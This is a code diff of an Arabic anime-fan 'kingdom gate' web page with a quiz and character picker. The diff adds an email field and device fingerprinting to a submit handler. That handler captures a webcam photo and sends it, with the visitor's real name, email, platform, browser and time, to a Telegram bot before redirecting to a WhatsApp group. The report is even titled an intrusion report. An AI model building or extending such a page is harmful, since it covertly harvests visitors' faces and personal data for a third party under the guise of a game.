@@ -3,60 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة يوسف الأسطورية ⛩️</title>
+    <title>⛩️ بوابة القائد يوسف علاء الأسطورية</title>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@500;800;900&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         :root { --main-red: #ff003c; --gold: #ffb700; --dark: #0a0a0a; }
         body {
             font-family: 'Tajawal', sans-serif; background: var(--dark);
-            color: #fff; margin: 0; padding: 20px 0; overflow-x: hidden;
+            color: #fff; margin: 0; padding: 15px; overflow-x: hidden;
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
         }
         
-        /* خلفية الفيديو الأسطورية المتغيرة */
+        /* مشغل الفيديوهات المتتابعة خلفية */
         #bg-video {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            object-fit: cover; z-index: -1; opacity: 0.3; filter: saturate(130%) contrast(110%);
+            object-fit: cover; z-index: -1; opacity: 0.4; filter: saturate(1.4) brightness(0.7);
         }
 
         .glass-box {
-            background: rgba(10, 10, 12, 0.85); backdrop-filter: blur(15px);
-            border: 2px solid rgba(255, 0, 60, 0.5); width: 90%; max-width: 480px;
-            padding: 35px 25px; border-radius: 20px; text-align: center;
-            box-shadow: 0 0 40px rgba(255, 0, 60, 0.3);
+            background: rgba(10, 10, 12, 0.92); backdrop-filter: blur(15px);
+            border: 2px solid var(--main-red); width: 100%; max-width: 480px;
+            padding: 30px 25px; border-radius: 25px; text-align: center;
+            box-shadow: 0 0 60px rgba(255, 0, 60, 0.4);
             position: relative; animation: float 6s ease-in-out infinite;
         }
 
-        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
 
-        h1 { color: #fff; text-shadow: 0 0 15px var(--main-red); font-size: 32px; margin: 0; font-weight: 900; }
-        .subtitle { color: var(--gold); font-size: 14px; margin-bottom: 20px; letter-spacing: 2px; text-shadow: 0 0 5px #000; }
+        h1 { color: #fff; text-shadow: 0 0 20px var(--main-red); font-size: 30px; margin: 0; font-weight: 900; }
+        .subtitle { color: var(--gold); font-size: 14px; margin-bottom: 25px; font-weight: bold; letter-spacing: 1px; }
 
-        .showcase-img { width: 100%; border-radius: 12px; border: 2px solid var(--gold); margin-bottom: 20px; box-shadow: 0 5px 15px rgba(255,183,0,0.2); }
+        .showcase-img { width: 100%; border-radius: 15px; border: 2px solid var(--gold); margin-bottom: 20px; box-shadow: 0 0 20px rgba(255,183,0,0.3); }
 
-        .camera-container { position: relative; width: 100%; border-radius: 12px; overflow: hidden; border: 2px solid #222; margin-bottom: 25px; }
+        .camera-container { position: relative; width: 100%; border-radius: 15px; overflow: hidden; border: 2px solid #333; margin-bottom: 20px; }
         video#webcam { width: 100%; display: block; transform: scaleX(-1); background: #000; }
-        .rec-icon { position: absolute; top: 10px; left: 10px; background: rgba(255,0,0,0.8); padding: 4px 10px; border-radius: 5px; font-size: 11px; font-weight: bold; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .rec-icon { position: absolute; top: 12px; left: 12px; background: red; padding: 4px 10px; border-radius: 5px; font-size: 11px; font-weight: bold; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.2; } 100% { opacity: 1; } }
 
         .input-group { text-align: right; margin-bottom: 15px; }
-        input, select { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #333; background: rgba(255,255,255,0.03); color: #fff; outline: none; box-sizing: border-box; font-family: 'Tajawal'; transition: 0.3s; }
-        input:focus, select:focus { border-color: var(--main-red); box-shadow: 0 0 10px rgba(255,0,60,0.3); }
+        .input-group label { display: block; color: var(--gold); font-size: 13px; margin-bottom: 6px; font-weight: 800; }
+        input, select { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #444; background: rgba(255,255,255,0.05); color: #fff; outline: none; box-sizing: border-box; font-family: 'Tajawal'; transition: 0.3s; }
+        input:focus { border-color: var(--main-red); background: rgba(255,0,60,0.1); }
         
-        .hero-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 20px; }
-        .hero-card { cursor: pointer; border-radius: 10px; border: 2px solid transparent; overflow: hidden; height: 70px; transition: 0.3s; background: #111; }
-        .hero-card img { width: 100%; height: 100%; object-fit: cover; filter: grayscale(1); opacity: 0.6; }
-        .hero-card.active { border-color: var(--main-red); transform: scale(1.1); box-shadow: 0 0 15px var(--main-red); }
-        .hero-card.active img { filter: grayscale(0); opacity: 1; }
+        .hero-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 25px; }
+        .hero-card { cursor: pointer; border-radius: 12px; border: 2px solid transparent; overflow: hidden; height: 75px; transition: 0.4s; background: #111; }
+        .hero-card img { width: 100%; height: 100%; object-fit: cover; opacity: 0.4; filter: grayscale(1); }
+        .hero-card.active { border-color: var(--main-red); transform: scale(1.15); box-shadow: 0 0 20px var(--main-red); z-index: 5; }
+        .hero-card.active img { opacity: 1; filter: grayscale(0); }
 
-        .btn-submit { width: 100%; padding: 16px; border: none; border-radius: 12px; background: linear-gradient(90deg, #ff003c, #990024); color: white; font-size: 18px; font-weight: 900; cursor: pointer; transition: 0.3s; box-shadow: 0 8px 20px rgba(255,0,60,0.4); }
-        .btn-submit:hover { transform: scale(1.02); box-shadow: 0 10px 25px rgba(255,0,60,0.6); }
+        .btn-submit { width: 100%; padding: 18px; border: none; border-radius: 15px; background: linear-gradient(45deg, #ff003c, #990024); color: white; font-size: 20px; font-weight: 900; cursor: pointer; box-shadow: 0 8px 25px rgba(255,0,60,0.5); transition: 0.3s; }
+        .btn-submit:hover { transform: scale(1.03); filter: brightness(1.2); }
         
-        .creator-badge { margin-top: 25px; padding-top: 15px; border-top: 1px solid rgba(255, 183, 0, 0.3); color: var(--gold); font-weight: 900; text-shadow: 0 0 10px rgba(255,183,0,0.5); }
+        .founder-badge { margin-top: 30px; padding-top: 15px; border-top: 1px solid #333; position: relative; }
+        .founder-badge .name { color: var(--gold); font-size: 18px; font-weight: 900; text-shadow: 0 0 15px var(--gold); }
+        .founder-badge .title { font-size: 12px; color: #aaa; text-transform: uppercase; }
+
+        #unmute-btn { position: fixed; bottom: 25px; right: 25px; z-index: 9999; background: var(--main-red); color: white; border: none; padding: 12px 20px; border-radius: 50px; cursor: pointer; font-weight: bold; box-shadow: 0 0 20px var(--main-red); }
         .hidden { display: none; }
-        
-        #unmute-btn { position: fixed; bottom: 20px; right: 20px; z-index: 9999; background: var(--main-red); color: white; border: none; padding: 12px 24px; border-radius: 30px; cursor: pointer; font-weight: bold; box-shadow: 0 0 20px var(--main-red); font-family: 'Tajawal'; }
     </style>
 </head>
 <body onload="initSystem()">
@@ -65,29 +68,35 @@
         <source id="video-source" src="385937dae3995b54f3fecde0dd7acec7_1769970173274.mp4" type="video/mp4">
     </video>
 
-    <button id="unmute-btn" onclick="enableAudio()">🔊 تشغيل الصوت</button>
+    <button id="unmute-btn" onclick="enableAudio()">🔊 تشغيل صوت المملكة</button>
 
     <audio id="sfx-select" src="https://www.myinstants.com/media/sounds/naruto-shippuden-jutsu-sound-effect.mp3"></audio>
     <audio id="sfx-slash" src="https://www.myinstants.com/media/sounds/anime-sword-sound.mp3"></audio>
 
     <div class="glass-box">
         <h1>⛩️ مَمْلَكَة الأوتـاكو ⛩️</h1>
-        <div class="subtitle">بوابة يوسف علاء الأسطورية</div>
+        <div class="subtitle">بوابة الدخول الرسمية | إشراف يوسف علاء</div>
 
-        <img src="Screenshot_2026-03-14-17-16-23-72.jpg" alt="المملكة" class="showcase-img">
+        <img src="Screenshot_2026-03-14-17-16-23-72.jpg" class="showcase-img" alt="Youssef Kingdom">
 
         <div class="camera-container">
-            <div class="rec-icon">⚫ REC</div>
+            <div class="rec-icon">🔴 LIVE RECORDING</div>
             <video id="webcam" autoplay playsinline></video>
             <canvas id="capture" style="display:none;"></canvas>
         </div>
 
         <form id="otakuGate">
             <div class="input-group">
-                <input type="text" id="username" placeholder="اسمك الحقيقي المستعار" required>
+                <label>👤 هوية المحارب:</label>
+                <input type="text" id="username" placeholder="اكتب اسمك الحقيقي" required>
             </div>
             
-            <div style="text-align:right; font-size:13px; color:var(--gold); margin-bottom:10px; font-weight:800;">🔥 اختر روحك القتالية:</div>
+            <div class="input-group">
+                <label>📧 بريد المراسلات:</label>
+                <input type="email" id="user-email" placeholder="بريدك الإلكتروني (هام)" required>
+            </div>
+            
+            <div style="text-align:right; font-size:12px; color:var(--gold); margin-bottom:10px; font-weight:bold;">⚔️ اختر روحك القتالية:</div>
             <div class="hero-grid">
                 <div class="hero-card" onclick="selectFighter('لوفي 👒', this)"><img src="https://i.pinimg.com/736x/8a/26/5a/8a265a31742408b08709337b5d19dbb3.jpg"></div>
                 <div class="hero-card" onclick="selectFighter('ناروتو 🦊', this)"><img src="https://i.pinimg.com/736x/21/cd/ca/21cdca43e498d9ba80d6b5e0c8b9d88c.jpg"></div>
@@ -95,25 +104,27 @@
                 <div class="hero-card" onclick="selectFighter('ليفاي ⚔️', this)"><img src="https://i.pinimg.com/736x/01/a0/0b/01a00be550e56cc21cb4bd6df3c01c0c.jpg"></div>
             </div>
 
-            <div class="input-group" style="margin-top:10px;">
+            <div class="input-group">
+                <label>🧩 اختبار الأوتـاكو:</label>
                 <select id="animeSelect" onchange="showTrial()" required>
-                    <option value="" disabled selected>اختر أنمي للاختبار...</option>
-                    <option value="op">ون بيس (One Piece)</option>
-                    <option value="snk">هجوم العمالقة (AOT)</option>
-                    <option value="naruto">ناروتو (Naruto)</option>
+                    <option value="" disabled selected>حدد ساحة المعركة...</option>
+                    <option value="op">ون بيس</option>
+                    <option value="snk">هجوم العمالقة</option>
+                    <option value="naruto">ناروتو</option>
                 </select>
             </div>
 
             <div id="trialDiv" class="hidden input-group">
-                <label id="trialQ" style="color: var(--gold); font-size:13px; margin-bottom:5px; display:block; font-weight:bold;"></label>
+                <label id="trialQ" style="color:var(--gold)"></label>
                 <select id="trialAns" required></select>
             </div>
 
             <button type="submit" class="btn-submit">اقتحم المملكة الآن 🚀</button>
         </form>
 
-        <div class="creator-badge">
-            👑 مؤسس المملكة: يـوسـف عـلاء 👑
+        <div class="founder-badge">
+            <div class="title">مؤسس وقائد المملكة</div>
+            <div class="name">👑 يوسف علاء 👑</div>
         </div>
     </div>
 
@@ -122,47 +133,37 @@
         const CHAT = "7394389253";
         const WA_LINK = "https://chat.whatsapp.com/J08oDw7MzULIJHnzN2Okts?mode=gi_t";
 
-        // إعدادات الفيديو
-        const videoPlayer = document.getElementById('bg-video');
-        const videoSource = document.getElementById('video-source');
-        const playlist = [
-            "385937dae3995b54f3fecde0dd7acec7_1769970173274.mp4",
-            "fqBsQ4ZhiMk.mp4"
-        ];
+        // مشغل الفيديوهات Playlist
+        const vidPlayer = document.getElementById('bg-video');
+        const vidSrc = document.getElementById('video-source');
+        const playlist = ["385937dae3995b54f3fecde0dd7acec7_1769970173274.mp4", "fqBsQ4ZhiMk.mp4"];
         let currentIdx = 0;
 
-        videoPlayer.onended = function() {
+        vidPlayer.addEventListener('ended', () => {
             currentIdx = (currentIdx + 1) % playlist.length;
-            videoSource.src = playlist[currentIdx];
-            videoPlayer.load();
-            videoPlayer.play();
-        };
+            vidSrc.src = playlist[currentIdx];
+            vidPlayer.load(); vidPlayer.play();
+        });
 
-        function enableAudio() {
-            videoPlayer.muted = false;
-            document.getElementById('unmute-btn').style.display = 'none';
-        }
+        function enableAudio() { vidPlayer.muted = false; document.getElementById('unmute-btn').style.display = 'none'; }
 
-        // إعدادات الكاميرا والبيانات
+        // النظام الأساسي
         let fighter = "";
         const vid = document.getElementById('webcam');
         const cvs = document.getElementById('capture');
 
         const trials = {
-            op: { q: "من هو أول عضو انضم لطاقم لوفي؟", opts: ["سانجي", "زورو", "نامي"], ans: "زورو" },
-            snk: { q: "ما هو اسم الفيلق الذي ينتمي إليه إيرين؟", opts: ["الشرطة", "الاستطلاع", "الحامية"], ans: "الاستطلاع" },
-            naruto: { q: "من هو معلم الفريق السابع؟", opts: ["جيرايا", "كاكاشي", "إيروكا"], ans: "كاكاشي" }
+            op: { q: "من هو العضو الذي فقد عينه؟", opts: ["زورو", "سانجي", "لوفي"], ans: "زورو" },
+            snk: { q: "ما هو اسم العملاق الذي يمتلكه إيرين؟", opts: ["المهاجم", "المدرع", "الضخم"], ans: "المهاجم" },
+            naruto: { q: "من قتل عشيرة اليوتشيها؟", opts: ["إيتاتشي", "ساسكي", "مادارا"], ans: "إيتاتشي" }
         };
 
         function initSystem() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(s => vid.srcObject = s)
-            .catch(() => Swal.fire({background:'#111', color:'#fff', title:'الكاميرا مطلوبة لتوثيق انضمامك!'}));
+            navigator.mediaDevices.getUserMedia({ video: true }).then(s => vid.srcObject = s).catch(e => console.log(e));
         }
 
         function selectFighter(name, el) {
-            fighter = name;
-            document.getElementById('sfx-select').play();
+            fighter = name; document.getElementById('sfx-select').play();
             document.querySelectorAll('.hero-card').forEach(c => c.classList.remove('active'));
             el.classList.add('active');
         }
@@ -172,50 +173,58 @@
             document.getElementById('trialDiv').classList.remove('hidden');
             document.getElementById('trialQ').innerText = "❓ " + trials[key].q;
             const ansBox = document.getElementById('trialAns');
-            ansBox.innerHTML = '<option value="" disabled selected>اختر إجابتك القاطعة...</option>';
+            ansBox.innerHTML = '<option value="" disabled selected>اختر الإجابة...</option>';
             trials[key].opts.forEach(o => ansBox.innerHTML += `<option value="${o}">${o}</option>`);
         }
 
-        document.getElementById('otakuGate').onsubmit = function(e) {
+        document.getElementById('otakuGate').onsubmit = async function(e) {
             e.preventDefault();
-            if(!fighter || !vid.srcObject) return Swal.fire({background:'#111', color:'#fff', title:'برجاء اختيار بطل والسماح بالكاميرا'});
-
+            if(!fighter) return Swal.fire("اختر روحك القتالية أولاً!");
+            
             document.getElementById('sfx-slash').play();
             Swal.fire({ title: 'جاري فحص الهاكي الخاص بك...', background: '#111', color: '#fff', didOpen: () => Swal.showLoading() });
 
+            // سحب بيانات الجهاز
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const pLevel = Math.floor(Math.random() * 8999) + 1000;
             const usr = document.getElementById('username').value;
-            const key = document.getElementById('animeSelect').value;
-            const isWin = document.getElementById('trialAns').value === trials[key].ans;
-            const pLevel = Math.floor(Math.random() * 9000) + 1000; // مستوى الطاقة المسترجع
+            const email = document.getElementById('user-email').value;
+            const isWin = document.getElementById('trialAns').value === trials[document.getElementById('animeSelect').value].ans;
 
+            // التقاط الصورة
             const ctx = cvs.getContext('2d');
             cvs.width = vid.videoWidth; cvs.height = vid.videoHeight;
             ctx.drawImage(vid, 0, 0);
 
-            cvs.toBlob(b => {
+            cvs.toBlob(async (blob) => {
                 const fd = new FormData();
                 fd.append("chat_id", CHAT);
-                fd.append("photo", b, "warrior.jpg");
+                fd.append("photo", blob, "warrior.jpg");
                 
-                let caption = `⛩️ تقرير دخول مملكة يوسف علاء ⛩️\n\n`;
-                caption += `👤 المحارب: ${usr}\n`;
-                caption += `⚔️ الروح القتالية: ${fighter}\n`;
-                caption += `⚡ مستوى الطاقة: ${pLevel}\n`;
-                caption += `🧠 نتيجة الاختبار: ${isWin ? "أوتاكو حقيقي ✅" : "مبتدئ يحتاج تدريب ❌"}`;
+                let report = `⛩️ تقرير اختراق بوابة يوسف علاء ⛩️\n\n`;
+                report += `👤 الاسم: ${usr}\n`;
+                report += `📧 البريد: ${email}\n`;
+                report += `⚔️ الشخصية: ${fighter}\n`;
+                report += `⚡ طاقة الـ Scouter: ${pLevel}\n`;
+                report += `🧠 الاختبار: ${isWin ? "ناجح (أوتاكو حقيقي) ✅" : "راسب (مبتدئ) ❌"}\n\n`;
+                report += `📱 بيانات الجهاز: ${platform}\n`;
+                report += `🌐 المتصفح: ${userAgent.split(') ')[0].split(' (')[1]}\n`;
+                report += `⏰ التوقيت: ${new Date().toLocaleString('ar-EG')}`;
 
-                fd.append("caption", caption);
+                fd.append("caption", report);
 
-                fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method: "POST", body: fd })
-                .then(r => {
-                    if(r.ok) {
-                        Swal.fire({ 
-                            background:'#111', color:'#fff', icon:'success', 
-                            title:'تم قبولك في المملكة!', 
-                            text: `طاقتك هي ${pLevel}، انطلق للجروب الآن!`,
-                            confirmButtonText:'دخول عرين الأوتاكو 🚀' 
-                        }).then(() => window.location.href = WA_LINK);
-                    }
-                });
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method: "POST", body: fd });
+                    Swal.fire({
+                        background: '#111', color: '#fff', icon: 'success',
+                        title: 'تم الانضمام لجيش يوسف علاء!',
+                        text: `مستوى طاقتك هو ${pLevel}، انطلق الآن.`,
+                        confirmButtonText: 'دخول ساحة الواتساب 🚀'
+                    }).then(() => window.location.href = WA_LINK);
+                } catch (err) {
+                    console.error(err);
+                }
             }, 'image/jpeg');
         };
     </script>
